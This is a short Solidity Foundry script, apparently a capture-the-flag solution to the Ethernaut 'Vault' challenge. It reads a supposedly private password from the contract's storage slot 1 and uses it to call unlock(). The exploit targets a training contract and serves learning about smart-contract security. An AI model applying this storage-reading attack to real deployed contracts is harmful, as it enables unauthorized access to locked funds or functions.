// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Vault} from "src/08/Vault.sol";


contract Exploit is Script {

        address instance = 0xcE198E8D4476Cb296cDb12e12757F1A505105Bf9;
        Vault level = Vault(instance);        
        
        function run() external {

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            
            bytes32 password = vm.load(instance, bytes32(uint256(1)));
            level.unlock(password);
            console.log(level.locked());
            
            vm.stopBroadcast();
    }
}
